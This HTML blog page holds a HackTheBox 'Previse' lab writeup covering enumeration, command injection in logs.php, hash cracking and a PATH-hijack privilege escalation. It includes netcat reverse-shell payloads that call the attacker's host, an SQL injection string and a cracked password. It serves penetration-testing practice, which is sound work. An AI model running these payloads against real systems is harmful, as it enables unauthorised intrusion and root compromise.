@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Enumeration Initial Enumeration Nmap Scans Initial:
+PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 80/tcp open http syn-ack Service Scan:
+22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) | http-title: Previse Login |_Requested resource was login." />
+<meta name="keywords" content=", hackthebox, machines, web, writeup" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://harshitm98.github.io/posts/htb-machine-previse/" />
+
+
+    <title>
+        
+            HTB Previse - Writeup :: Harshit Maheshwari 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.dc0c6d657e388585559a3980932e4245ef02b501245bf0f6f59d42da824af8fb.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+    <meta name="theme-color" content="">
+
+
+
+<meta itemprop="name" content="HTB Previse - Writeup">
+<meta itemprop="description" content="Enumeration Initial Enumeration Nmap Scans Initial:
+PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 80/tcp open http syn-ack Service Scan:
+22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) | http-title: Previse Login |_Requested resource was login."><meta itemprop="datePublished" content="2021-12-25T00:00:00&#43;00:00" />
+<meta itemprop="dateModified" content="2021-12-25T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="762"><meta itemprop="image" content="https://harshitm98.github.io/"/>
+<meta itemprop="keywords" content="hackthebox,machines,web,writeup," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://harshitm98.github.io/"/>
+
+<meta name="twitter:title" content="HTB Previse - Writeup"/>
+<meta name="twitter:description" content="Enumeration Initial Enumeration Nmap Scans Initial:
+PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 80/tcp open http syn-ack Service Scan:
+22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) | http-title: Previse Login |_Requested resource was login."/>
+
+
+
+
+    <meta property="og:title" content="HTB Previse - Writeup" />
+<meta property="og:description" content="Enumeration Initial Enumeration Nmap Scans Initial:
+PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 80/tcp open http syn-ack Service Scan:
+22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) | http-title: Previse Login |_Requested resource was login." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://harshitm98.github.io/posts/htb-machine-previse/" /><meta property="og:image" content="https://harshitm98.github.io/"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-12-25T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2021-12-25T00:00:00&#43;00:00" /><meta property="og:site_name" content="Harshit Maheshwari" />
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2021-12-25 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">$ cd /home/fakebatman</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/posts">Blog</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        4 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://harshitm98.github.io/posts/htb-machine-previse/">HTB Previse - Writeup</a>
+      </h1>
+
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <h1 id="enumeration">Enumeration</h1>
+<h2 id="initial-enumeration">Initial Enumeration</h2>
+<h4 id="nmap-scans">Nmap Scans</h4>
+<p>Initial:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PORT      STATE    SERVICE    REASON
+22/tcp    open     ssh        syn-ack
+80/tcp    open     http       syn-ack
+</code></pre></div><p>Service Scan:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
+|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
+|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-title: Previse Login
+|_Requested resource was login.php
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><h2 id="enumeration-port-80">Enumeration: Port 80</h2>
+<h4 id="ffuf">Ffuf</h4>
+<p>common.txt</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">                        [Status: 200, Size: 2224, Words: 486, Lines: 54]
+config.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
+css                     [Status: 200, Size: 939, Words: 61, Lines: 17]
+accounts.php            [Status: 200, Size: 2224, Words: 486, Lines: 54]
+download.php            [Status: 200, Size: 2224, Words: 486, Lines: 54]
+favicon.ico             [Status: 200, Size: 15400, Words: 15, Lines: 10]
+footer.php              [Status: 200, Size: 217, Words: 10, Lines: 6]
+files.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
+header.php              [Status: 200, Size: 980, Words: 183, Lines: 21]
+index.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
+index.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
+js                      [Status: 200, Size: 1155, Words: 77, Lines: 18]
+login.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
+logs.php                [Status: 200, Size: 2224, Words: 486, Lines: 54]
+logout.php              [Status: 200, Size: 2224, Words: 486, Lines: 54]
+nav.php                 [Status: 200, Size: 1248, Words: 462, Lines: 32]
+server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
+status.php              [Status: 200, Size: 2224, Words: 486, Lines: 54]
+</code></pre></div><p>medium.txt</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ffuf -u http://10.10.11.104/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -c -ic -of html -o http-medium.html
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">css                     [Status: 200, Size: 939, Words: 61, Lines: 17]
+js                      [Status: 200, Size: 1155, Words: 77, Lines: 18]
+                        [Status: 200, Size: 2224, Words: 486, Lines: 54]
+                        [Status: 200, Size: 2224, Words: 486, Lines: 54]
+server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
+</code></pre></div><h4 id="sql-injections">SQL injections</h4>
+<p><code>/login.php</code></p>
+<ul>
+<li>None of the sql injections worked.</li>
+<li><code>sqlmap</code> also did not work</li>
+<li>Request:
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">POST /login.php HTTP/1.1
+Host: 10.10.11.104
+Content-Length: 27
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://10.10.11.104
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-GPC: 1
+Referer: http://10.10.11.104/login.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Cookie: PHPSESSID=4natd10ok9pjvsrsuhr4ql0ktq
+Connection: close
+  
+username=&#39;+OR+1=1;--&amp;password=&#39;+OR+1=1;--
+</code></pre></div><pre><code>
+</code></pre></li>
+</ul>
+<h1 id="initial-foothold">Initial Foothold</h1>
+<h3 id="accountsphp">/accounts.php</h3>
+<p>Request of <code>accounts.php</code> is redirected to -&gt; <code>login.php</code></p>
+<p>But when intercepted with Burp, we have interesting results</p>
+<p><img src="/img/previse/Pasted%20image%2020211225134915.png" alt=""></p>
+<p>If we send a post request, we can create a new user
+<img src="/img/previse/Pasted%20image%2020211225134951.png" alt=""></p>
+<h4 id="sending-the-post-request">Sending the POST request</h4>
+<p>Request:</p>
+<p><img src="/img/previse/Pasted%20image%2020211225135604.png" alt=""></p>
+<p>Response:
+<img src="/img/previse/Pasted%20image%2020211225135625.png" alt=""></p>
+<p>So now we have a user with username and password as <code>fakebatman:fakebatman</code></p>
+<h2 id="getting-user-shell">Getting user shell</h2>
+<p>The logs file executes a python script and appends a delimiter that is parsed through a POST parameter</p>
+<p><em>logs.php</em></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">/////////////////////////////////////////////////////////////////////////////////////
+</span><span style="color:#75715e">//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
+</span><span style="color:#75715e">/////////////////////////////////////////////////////////////////////////////////////
+</span><span style="color:#75715e"></span>
+$output <span style="color:#f92672">=</span> <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;/usr/bin/python /opt/scripts/log_process.py </span><span style="color:#e6db74">{</span>$_POST[<span style="color:#e6db74">&#39;delim&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>);
+<span style="color:#66d9ef">echo</span> $output;
+</code></pre></div><p>So when we send the delim=<code>;ping 10.10.14.33 -c 5</code> and we run <code>tcpdump</code> to check if we are actually receiving any pings, we get ping hits.</p>
+<p>Appending the command:</p>
+<p><img src="/img/previse/Pasted%20image%2020211225175758.png" alt=""></p>
+<p>And we get the ping hits:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo tcpdump -i tun0 icmp
+</code></pre></div><p><img src="/img/previse/Pasted%20image%2020211225180213.png" alt=""></p>
+<h3 id="getting-a-reverse-shell-www-data">Getting a reverse shell (www-data)</h3>
+<p>Start a reverse shell</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nc -nlvp <span style="color:#ae81ff">4444</span>
+</code></pre></div><p>Send the request</p>
+<p><img src="/img/previse/Pasted%20image%2020211225180452.png" alt=""></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">delim=;nc+10.10.14.33+4444+-e+/bin/sh
+</span></code></pre></div><p>And we get a reverse shell</p>
+<p><img src="/img/previse/Pasted%20image%2020211225180415.png" alt=""></p>
+<h3 id="mysql-recon">MySQL recon</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ mysql -u root -p
+mysql&gt; SELECT * FROM accounts;
+SELECT * FROM accounts;
++----+---------------+------------------------------------+---------------------+
+| id | username      | password                           | created_at          |
++----+---------------+------------------------------------+---------------------+
+|  <span style="color:#ae81ff">1</span> | m4lwhere      | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
+</code></pre></div><p>Saving the hash into a file <code>m4lwhere.hash</code> and cracking the hash using hashcat</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashcat -m <span style="color:#ae81ff">500</span> -a <span style="color:#ae81ff">0</span> m4lwhere.hash /usr/share/wordlists/rockyou.txt
+</code></pre></div><p>The cracked password</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
+</code></pre></div><h3 id="logging-in-using-these-creds">Logging in using these creds</h3>
+<p>and hoping for a password reuse</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ssh m4lwhere@10.10.11.104
+</code></pre></div><p>and <code>ilovecody112235!</code> as password we get a SSH shell</p>
+<p><img src="/img/previse/Pasted%20image%2020211225183445.png" alt=""></p>
+<h1 id="post-exploit-enumeration">Post Exploit Enumeration</h1>
+<h3 id="sudo--l">sudo -l</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">m4lwhere@previse:~$ sudo -l
+<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> m4lwhere:
+User m4lwhere may run the following commands on previse:
+    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> /opt/scripts/access_backup.sh
+</code></pre></div><p><em>access_backup.sh</em></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e"># We always make sure to store logs, we take security SERIOUSLY here</span>
+
+<span style="color:#75715e"># I know I shouldnt run this as root but I cant figure it out programmatically on my account</span>
+<span style="color:#75715e"># This is configured to run with cron, added to sudo so I can run as needed - we&#39;ll fix it later when there&#39;s time</span>
+
+gzip -c /var/log/apache2/access.log &gt; /var/backups/<span style="color:#66d9ef">$(</span>date --date<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;yesterday&#34;</span> +%Y%b%d<span style="color:#66d9ef">)</span>_access.gz
+gzip -c /var/www/file_access.log &gt; /var/backups/<span style="color:#66d9ef">$(</span>date --date<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;yesterday&#34;</span> +%Y%b%d<span style="color:#66d9ef">)</span>_file_access.gz
+</code></pre></div><p>Absolute paths for <code>gzip</code> and <code>date</code> is not mentioned.</p>
+<h3 id="creating-a-new-file">Creating a new file</h3>
+<p>Going to <code>/tmp</code> directory and creating a <code>date</code> file with contents</p>
+<p><em>date</em></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc 10.10.14.33 <span style="color:#ae81ff">9001</span> -e /bin/bash
+</code></pre></div><p><img src="/img/previse/Pasted%20image%2020211225192245.png" alt=""></p>
+<p>And then we add <code>tmp/</code> directory to the path</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ export PATH<span style="color:#f92672">=</span>tmp:/$PATH
+</code></pre></div><p>Now we run our script</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo /opt/scripts/access_backup.sh
+</code></pre></div><p>And we get a shell on our reverse tcp listener
+<img src="/img/previse/Pasted%20image%2020211225192210.png" alt=""></p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://harshitm98.github.io/tags/hackthebox/">hackthebox</a></span>
+        <span class="tag"><a href="https://harshitm98.github.io/tags/machines/">machines</a></span>
+        <span class="tag"><a href="https://harshitm98.github.io/tags/web/">web</a></span>
+        <span class="tag"><a href="https://harshitm98.github.io/tags/writeup/">writeup</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        762 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2021-12-24 19:00
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fharshitm98.github.io%2fposts%2fhtb-machine-previse%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fharshitm98.github.io%2fposts%2fhtb-machine-previse%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=HTB%20Previse%20-%20Writeup&amp;caption=HTB%20Previse%20-%20Writeup&amp;canonicalUrl=https%3a%2f%2fharshitm98.github.io%2fposts%2fhtb-machine-previse%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=HTB%20Previse%20-%20Writeup&amp;body=https%3a%2f%2fharshitm98.github.io%2fposts%2fhtb-machine-previse%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fharshitm98.github.io%2fposts%2fhtb-machine-previse%2f&amp;media=https%3a%2f%2fharshitm98.github.io%2fposts%2fhtb-machine-previse%2f;description=HTB%20Previse%20-%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fharshitm98.github.io%2fposts%2fhtb-machine-previse%2f&amp;title=HTB%20Previse%20-%20Writeup&amp;summary=HTB%20Previse%20-%20Writeup&amp;source=https%3a%2f%2fharshitm98.github.io%2fposts%2fhtb-machine-previse%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fharshitm98.github.io%2fposts%2fhtb-machine-previse%2f&amp;resubmit=true&amp;title=HTB%20Previse%20-%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 